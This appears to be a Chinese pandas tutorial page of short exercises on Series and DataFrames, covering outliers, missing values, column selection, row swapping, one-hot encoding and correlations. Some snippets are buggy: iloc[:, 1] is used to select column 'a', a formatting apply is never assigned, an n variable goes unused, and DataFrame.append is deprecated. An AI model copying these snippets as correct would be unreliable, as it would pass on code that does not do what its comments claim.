<h4 id="用最少出现的字符替换空格符"><a href="#用最少出现的字符替换空格符" class="headerlink" title="用最少出现的字符替换空格符"></a>用最少出现的字符替换空格符</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">my_str = <span class="string">&#x27;dbc deb abed gade&#x27;</span></span><br><span class="line"></span><br><span class="line">ser = pd.Series(<span class="built_in">list</span>(<span class="string">&#x27;dbc deb abed gade&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计元素的频数</span></span><br><span class="line">freq = ser.value_counts()</span><br><span class="line"><span class="built_in">print</span>(freq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求最小频数的字符</span></span><br><span class="line">least_freq = freq.dropna().index[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(ser.replace(<span class="string">&#x27; &#x27;</span>, least_freq)))</span><br></pre></td></tr></table></figure>

<h4 id="计算数值series的自相关系数"><a href="#计算数值series的自相关系数" class="headerlink" title="计算数值series的自相关系数"></a>计算数值series的自相关系数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">ser = pd.Series(np.arange(<span class="number">20</span>) + np.random.normal(<span class="number">1</span>, <span class="number">10</span>, <span class="number">20</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求series的自相关系数，i为偏移量</span></span><br><span class="line">autocorrelations = [ser.autocorr(i).<span class="built_in">round</span>(<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>)]</span><br><span class="line"><span class="built_in">print</span>(autocorrelations[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择最大的偏移量</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Lag having highest correlation: &#x27;</span>, np.argmax(np.<span class="built_in">abs</span>(autocorrelations[<span class="number">1</span>:]))+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h4 id="从series中查找异常值并赋值"><a href="#从series中查找异常值并赋值" class="headerlink" title="从series中查找异常值并赋值"></a>从series中查找异常值并赋值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">ser = pd.Series(np.logspace(-<span class="number">2</span>, <span class="number">2</span>, <span class="number">30</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 小于low_per分位的数赋值为low，大于low_per分位的数赋值为high</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cap_outliers</span>(<span class="params">ser, low_perc, high_perc</span>):</span></span><br><span class="line">    low, high = ser.quantile([low_perc, high_perc])</span><br><span class="line">    <span class="built_in">print</span>(low_perc, <span class="string">&#x27;%ile: &#x27;</span>, low, <span class="string">&#x27;|&#x27;</span>, high_perc, <span class="string">&#x27;%ile: &#x27;</span>, high)</span><br><span class="line">    ser[ser &lt; low] = low</span><br><span class="line">    ser[ser &gt; high] = high</span><br><span class="line">    <span class="keyword">return</span>(ser)</span><br><span class="line"></span><br><span class="line">capped_ser = cap_outliers(ser, <span class="number">.05</span>, <span class="number">.95</span>)</span><br><span class="line"><span class="built_in">print</span>(capped_ser)</span><br></pre></td></tr></table></figure>

<h3 id="dataframe"><a href="#dataframe" class="headerlink" title="dataframe"></a>dataframe</h3><p>二维数据结构，</p>
<p>数据以表格形式（与excel类似）存储，有对应的行和列。</p>
<p>dataframe结构名称：|索引列|数据列1|数据列2|</p>
<h4 id="从csv文件只读取数据"><a href="#从csv文件只读取数据" class="headerlink" title="从csv文件只读取数据"></a>从csv文件只读取数据</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取前10行，指定列的数据</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;./log.csv&#x27;</span>,nrows=<span class="number">10</span>,usecols=[<span class="string">&#x27;userid&#x27;</span>,<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;date&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(df)</span><br></pre></td></tr></table></figure>

<h4 id="从csv文件中每隔n行来创建dataframe"><a href="#从csv文件中每隔n行来创建dataframe" class="headerlink" title="从csv文件中每隔n行来创建dataframe"></a>从csv文件中每隔n行来创建dataframe</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每隔100行读取一行数据</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;./log.csv&#x27;</span>,chunksize=<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">df_n = pd.DataFrame()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> chunk <span class="keyword">in</span> df:</span><br><span class="line">    df_n = df_n.append(chunk.iloc[<span class="number">0</span>,:])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df_n.head())</span><br></pre></td></tr></table></figure>

<h4 id="改变导入csv文件的列值"><a href="#改变导入csv文件的列值" class="headerlink" title="改变导入csv文件的列值"></a>改变导入csv文件的列值</h4><p>改变userid的值，当值大于600时赋值’High’否在赋值’Low’</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用converters参数，改变userid列的值</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;./log.csv&#x27;</span>,nrows=<span class="number">50</span>,converters=&#123;<span class="string">&#x27;userid&#x27;</span>: <span class="keyword">lambda</span> x: <span class="string">&#x27;High&#x27;</span> <span class="keyword">if</span> <span class="built_in">float</span>(x) &gt; <span class="number">600</span> <span class="keyword">else</span> <span class="string">&#x27;Low&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df)</span><br></pre></td></tr></table></figure>

<h4 id="获得dataframe的行，列，每一列的类型和相应的描述统计信息"><a href="#获得dataframe的行，列，每一列的类型和相应的描述统计信息" class="headerlink" title="获得dataframe的行，列，每一列的类型和相应的描述统计信息"></a>获得dataframe的行，列，每一列的类型和相应的描述统计信息</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;./log.csv&#x27;</span>,nrows=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (50,4) 50行4列</span></span><br><span class="line"><span class="built_in">print</span>(df.shape) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印每一列的数据类型</span></span><br><span class="line"><span class="built_in">print</span>(df.dtypes) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计各类型的数目</span></span><br><span class="line"><span class="built_in">print</span>(df.dtypes.value_counts())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 描述每列的统计信息，如std，四分位数等</span></span><br><span class="line">df_stats = df.describe()</span><br><span class="line"><span class="built_in">print</span>(df_stats)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dataframe转化&quot;数组&quot;</span></span><br><span class="line">df_arr = df.values</span><br><span class="line"><span class="built_in">print</span>(df_arr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组转化为列表</span></span><br><span class="line">df_list = df.values.tolist()</span><br><span class="line"><span class="built_in">print</span>(df_list)</span><br></pre></td></tr></table></figure>

<h4 id="获取给定条件的行和列"><a href="#获取给定条件的行和列" class="headerlink" title="获取给定条件的行和列"></a>获取给定条件的行和列</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;./log.csv&#x27;</span>,nrows=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取最大值的行和列（位置）</span></span><br><span class="line">row, col = np.where(df.values == np.<span class="built_in">max</span>(df.userid))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pandas中df的查询方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 行和列获取最大值</span></span><br><span class="line"><span class="built_in">print</span>(df.iat[row[<span class="number">0</span>], col[<span class="number">0</span>]])</span><br><span class="line"><span class="built_in">print</span>(df.iloc[row[<span class="number">0</span>], col[<span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 行索引和列名获取最大值</span></span><br><span class="line"><span class="built_in">print</span>(df.at[row[<span class="number">0</span>], <span class="string">&#x27;userid&#x27;</span>])</span><br></pre></td></tr></table></figure>

<h4 id="重命名dataframe的特定列"><a href="#重命名dataframe的特定列" class="headerlink" title="重命名dataframe的特定列"></a>重命名dataframe的特定列</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df1 = pd.DataFrame(data=np.array([[<span class="number">18</span>,<span class="number">50</span>],[<span class="number">19</span>,<span class="number">51</span>],[<span class="number">20</span>,<span class="number">55</span>]]),index=[<span class="string">&#x27;man1&#x27;</span>,<span class="string">&#x27;man2&#x27;</span>,<span class="string">&#x27;man3&#x27;</span>],columns=[<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;weight&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(df1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改列名</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nchange columns :\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法1</span></span><br><span class="line">df1.rename(columns=&#123;<span class="string">&#x27;weight&#x27;</span>:<span class="string">&#x27;test1&#x27;</span>&#125;, inplace=<span class="literal">True</span>) <span class="comment"># columns = &#123;&quot;old1&quot;: &quot;new1&quot;, &quot;old2&quot;:&quot;new2&quot;&#125;</span></span><br><span class="line"><span class="built_in">print</span>(df1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2</span></span><br><span class="line">df1.columns.values[<span class="number">1</span>] = <span class="string">&#x27;test2&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(df1)</span><br></pre></td></tr></table></figure>

<h4 id="检查dataframe中是否有缺失值"><a href="#检查dataframe中是否有缺失值" class="headerlink" title="检查dataframe中是否有缺失值"></a>检查dataframe中是否有缺失值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;./log.csv&#x27;</span>,nrows=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若有缺失值，则为Ture</span></span><br><span class="line"><span class="built_in">print</span>(df.isnull().values.<span class="built_in">any</span>())</span><br></pre></td></tr></table></figure>

<h4 id="统计dataframe的每列中缺失值的个数"><a href="#统计dataframe的每列中缺失值的个数" class="headerlink" title="统计dataframe的每列中缺失值的个数"></a>统计dataframe的每列中缺失值的个数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;./miss.csv&#x27;</span>,nrows=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取每列的缺失值个数</span></span><br><span class="line">n_missings_each_col = df.apply(<span class="keyword">lambda</span> x: x.isnull().<span class="built_in">sum</span>())</span><br><span class="line"><span class="built_in">print</span>(n_missings_each_col.head())</span><br></pre></td></tr></table></figure>

<h4 id="用平均值替换相应列的缺失值"><a href="#用平均值替换相应列的缺失值" class="headerlink" title="用平均值替换相应列的缺失值"></a>用平均值替换相应列的缺失值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;./miss.csv&#x27;</span>,nrows=<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(df[[<span class="string">&#x27;Min.Price&#x27;</span>,<span class="string">&#x27;Max.Price&#x27;</span>]].head())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 平均值替换缺失值</span></span><br><span class="line">df_out = df[[<span class="string">&#x27;Min.Price&#x27;</span>, <span class="string">&#x27;Max.Price&#x27;</span>]] = df[[<span class="string">&#x27;Min.Price&#x27;</span>, <span class="string">&#x27;Max.Price&#x27;</span>]].apply(<span class="keyword">lambda</span> x: x.fillna(x.mean()))</span><br><span class="line"><span class="built_in">print</span>(df_out.head())</span><br></pre></td></tr></table></figure>

<h4 id="以dataframe的形式选择特定的列"><a href="#以dataframe的形式选择特定的列" class="headerlink" title="以dataframe的形式选择特定的列"></a>以dataframe的形式选择特定的列</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">20</span>).reshape(-<span class="number">1</span>, <span class="number">5</span>), columns=<span class="built_in">list</span>(<span class="string">&#x27;abcde&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以dataframe的形式选择特定的列</span></span><br><span class="line"><span class="built_in">print</span>(df[[<span class="string">&#x27;a&#x27;</span>]])</span><br><span class="line"><span class="built_in">print</span>(df.loc[:, [<span class="string">&#x27;a&#x27;</span>]]) <span class="comment"># 逗号前是控制行，逗号后控制列</span></span><br><span class="line"><span class="built_in">print</span>(df.iloc[:, [<span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以series的形式选择特定的列</span></span><br><span class="line"><span class="built_in">print</span>(df.a)</span><br><span class="line"><span class="built_in">print</span>(df[<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(df.loc[:, <span class="string">&#x27;a&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(df.iloc[:, <span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<h4 id="改变dataframe中的列顺序"><a href="#改变dataframe中的列顺序" class="headerlink" title="改变dataframe中的列顺序"></a>改变dataframe中的列顺序</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">20</span>).reshape(-<span class="number">1</span>, <span class="number">5</span>), columns=<span class="built_in">list</span>(<span class="string">&#x27;abcde&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交换col1和col2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">switch_columns</span>(<span class="params">df, col1=<span class="literal">None</span>, col2=<span class="literal">None</span></span>):</span></span><br><span class="line">    colnames = df.columns.tolist()</span><br><span class="line">    i1, i2 = colnames.index(col1), colnames.index(col2)</span><br><span class="line">    colnames[i2], colnames[i1] = colnames[i1], colnames[i2]</span><br><span class="line">    <span class="keyword">return</span> df[colnames]</span><br><span class="line"></span><br><span class="line">df1 = switch_columns(df, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(df1)</span><br></pre></td></tr></table></figure>

<h4 id="格式化dataframe的值"><a href="#格式化dataframe的值" class="headerlink" title="格式化dataframe的值"></a>格式化dataframe的值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.random.random(<span class="number">4</span>)**<span class="number">10</span>, columns=[<span class="string">&#x27;random&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示小数点后四位</span></span><br><span class="line"><span class="comment"># apply 是灵魂</span></span><br><span class="line">df.apply(<span class="keyword">lambda</span> x: <span class="string">&#x27;%.4f&#x27;</span> % x, axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(df)</span><br></pre></td></tr></table></figure>

<h4 id="从dataframe中每隔n行构建dataframe"><a href="#从dataframe中每隔n行构建dataframe" class="headerlink" title="从dataframe中每隔n行构建dataframe"></a>从dataframe中每隔n行构建dataframe</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;./miss.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每隔20行读dataframe数据</span></span><br><span class="line"><span class="built_in">print</span>(df.iloc[::<span class="number">20</span>, :][[<span class="string">&#x27;Manufacturer&#x27;</span>, <span class="string">&#x27;Model&#x27;</span>, <span class="string">&#x27;Type&#x27;</span>]])</span><br></pre></td></tr></table></figure>

<h4 id="得到列中前n个最大值对应的索引"><a href="#得到列中前n个最大值对应的索引" class="headerlink" title="得到列中前n个最大值对应的索引"></a>得到列中前n个最大值对应的索引</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.random.randint(<span class="number">1</span>, <span class="number">15</span>, <span class="number">15</span>).reshape(<span class="number">5</span>,-<span class="number">1</span>), columns=<span class="built_in">list</span>(<span class="string">&#x27;abc&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取&#x27;a&#x27;列前3个最大值对应的行</span></span><br><span class="line">n = <span class="number">5</span></span><br><span class="line">df_m = df[<span class="string">&#x27;a&#x27;</span>].argsort()[::-<span class="number">1</span>].iloc[:<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(df_m)</span><br></pre></td></tr></table></figure>

<h4 id="获得dataframe行的和大于100的最末n行索引"><a href="#获得dataframe行的和大于100的最末n行索引" class="headerlink" title="获得dataframe行的和大于100的最末n行索引"></a>获得dataframe行的和大于100的最末n行索引</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.random.randint(<span class="number">10</span>, <span class="number">40</span>, <span class="number">16</span>).reshape(-<span class="number">1</span>, <span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dataframe每行的和</span></span><br><span class="line">rowsums = df.apply(np.<span class="built_in">sum</span>, axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选取大于100的最末两行索引</span></span><br><span class="line"><span class="comment"># last_two_rows = df.iloc[np.where(rowsums &gt; 100)[0][-2:], :]</span></span><br><span class="line">nline = np.where(rowsums &gt; <span class="number">100</span>)[<span class="number">0</span>][-<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(nline)</span><br></pre></td></tr></table></figure>

<h4 id="交换dataframe的两行"><a href="#交换dataframe的两行" class="headerlink" title="交换dataframe的两行"></a>交换dataframe的两行</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">9</span>).reshape(<span class="number">3</span>, -<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap_rows</span>(<span class="params">df, i1, i2</span>):</span></span><br><span class="line">    a, b = df.iloc[i1, :].copy(), df.iloc[i2, :].copy()</span><br><span class="line">    <span class="comment"># 通过iloc换行</span></span><br><span class="line">    df.iloc[i1, :], df.iloc[i2, :] = b, a</span><br><span class="line">    <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2和3行互换</span></span><br><span class="line"><span class="built_in">print</span>(swap_rows(df, <span class="number">1</span>, <span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<h4 id="倒转dataframe的行"><a href="#倒转dataframe的行" class="headerlink" title="倒转dataframe的行"></a>倒转dataframe的行</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">9</span>).reshape(<span class="number">3</span>, -<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法 1</span></span><br><span class="line"><span class="built_in">print</span>(df.iloc[::-<span class="number">1</span>, :])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法 2</span></span><br><span class="line"><span class="built_in">print</span>(df.loc[df.index[::-<span class="number">1</span>], :])</span><br></pre></td></tr></table></figure>

<h4 id="对分类变量进行one-hot编码"><a href="#对分类变量进行one-hot编码" class="headerlink" title="对分类变量进行one-hot编码"></a>对分类变量进行one-hot编码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">25</span>).reshape(<span class="number">5</span>,-<span class="number">1</span>), columns=<span class="built_in">list</span>(<span class="string">&#x27;abcde&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对列&#x27;a&#x27;进行onehot编码</span></span><br><span class="line">df_onehot = pd.concat([pd.get_dummies(df[<span class="string">&#x27;a&#x27;</span>]), df[<span class="built_in">list</span>(<span class="string">&#x27;bcde&#x27;</span>)]], axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(df_onehot)</span><br></pre></td></tr></table></figure>

<h4 id="获取dataframe行方向上最大值个数最多的列"><a href="#获取dataframe行方向上最大值个数最多的列" class="headerlink" title="获取dataframe行方向上最大值个数最多的列"></a>获取dataframe行方向上最大值个数最多的列</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.random.randint(<span class="number">1</span>,<span class="number">100</span>, <span class="number">9</span>).reshape(<span class="number">3</span>, -<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取每列包含行方向上最大值的个数</span></span><br><span class="line">count_series = df.apply(np.argmax, axis=<span class="number">1</span>).value_counts()</span><br><span class="line"><span class="built_in">print</span>(count_series)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出行方向最大值个数最多的列的索引</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Column with highest row maxes: &#x27;</span>, count_series.index[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<h4 id="得到列之间最大的相关系数"><a href="#得到列之间最大的相关系数" class="headerlink" title="得到列之间最大的相关系数"></a>得到列之间最大的相关系数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.random.randint(<span class="number">1</span>,<span class="number">100</span>, <span class="number">16</span>).reshape(<span class="number">4</span>, -<span class="number">1</span>), columns=<span class="built_in">list</span>(<span class="string">&#x27;pqrs&#x27;</span>), index=<span class="built_in">list</span>(<span class="string">&#x27;abcd&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到四个列的相关系数</span></span><br><span class="line">abs_corrmat = np.<span class="built_in">abs</span>(df.corr())</span><br><span class="line"><span class="built_in">print</span>(abs_corrmat)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到每个列名与其他列的最大相关系数</span></span><br><span class="line">max_corr = abs_corrmat.apply(<span class="keyword">lambda</span> x: <span class="built_in">sorted</span>(x)[-<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示每列与其他列的相关系数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Maximum Correlation possible for each column: &#x27;</span>, np.<span class="built_in">round</span>(max_corr.tolist(), <span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<h4 id="创建包含每行最小值与最大值比例的列"><a href="#创建包含每行最小值与最大值比例的列" class="headerlink" title="创建包含每行最小值与最大值比例的列"></a>创建包含每行最小值与最大值比例的列</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.random.randint(<span class="number">1</span>,<span class="number">100</span>, <span class="number">9</span>).reshape(<span class="number">3</span>, -<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法1：axis=1表示行方向，</span></span><br><span class="line">min_by_max = df.apply(<span class="keyword">lambda</span> x: np.<span class="built_in">min</span>(x)/np.<span class="built_in">max</span>(x), axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2</span></span><br><span class="line">min_by_max = np.<span class="built_in">min</span>(df, axis=<span class="number">1</span>)/np.<span class="built_in">max</span>(df, axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(min_by_max)</span><br></pre></td></tr></table></figure>

<h4 id="创建包含每行第二大值的列"><a href="#创建包含每行第二大值的列" class="headerlink" title="创建包含每行第二大值的列"></a>创建包含每行第二大值的列</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.random.randint(<span class="number">1</span>,<span class="number">100</span>, <span class="number">9</span>).reshape(<span class="number">3</span>, -<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 行方向上取第二大的值组成series</span></span><br><span class="line">out = df.apply(<span class="keyword">lambda</span> x: x.sort_values().unique()[-<span class="number">2</span>], axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建dataframe新的列</span></span><br><span class="line">df[<span class="string">&#x27;penultimate&#x27;</span>] = out</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df)</span><br></pre></td></tr></table></figure>

